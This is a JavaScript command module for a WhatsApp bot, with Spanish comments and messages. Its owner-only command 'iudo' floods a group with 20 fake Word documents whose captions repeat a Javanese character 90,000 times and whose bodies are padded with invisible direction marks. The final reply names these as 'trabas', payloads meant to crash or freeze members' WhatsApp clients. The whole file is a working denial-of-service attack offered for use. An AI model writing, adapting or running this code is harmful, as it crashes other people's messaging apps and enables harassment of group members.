let handler = async (m, { conn }) => {
  const ownerNumber = '527447800928@s.whatsapp.net'; // Tu número real
  const botNumber = conn.user?.jid || '';
  const sender = m.sender;

  if (sender !== ownerNumber && sender !== botNumber) {
    return conn.reply(m.chat, '👑 Este comando solo está disponible para el owner y el número del bot.', m);
  }

  if (!m.chat.endsWith('@g.us')) {
    return conn.reply(m.chat, '❌ Este comando solo se puede usar dentro de un grupo.', m);
  }

  const groupId = m.chat;
  const descripcionBase = 'ꦾ';
  const descripcionFinal = descripcionBase.repeat(90000).trim();

  for (let i = 0; i < 20; i++) {
    const contenidoInvisible = '\u200E'.repeat(5000) + i;
    const fakeDoc = Buffer.from(contenidoInvisible);
    const fileName = `🔥𝗧𝗢𝗕𝗜🔥_${i + 1}`.repeat(2);

    await conn.sendMessage(groupId, {
      document: fakeDoc,
      fileName,
      mimetype: 'application/msword',
      caption: descripcionFinal
    });
  }

  await conn.reply(m.chat, '😼 20 trabas para crash iu enviados con éxito en este grupo.', m);
};

handler.help = ['iudo'];
handler.tags = ['tools', 'grupo'];
handler.command = ['iudo'];

export default handler;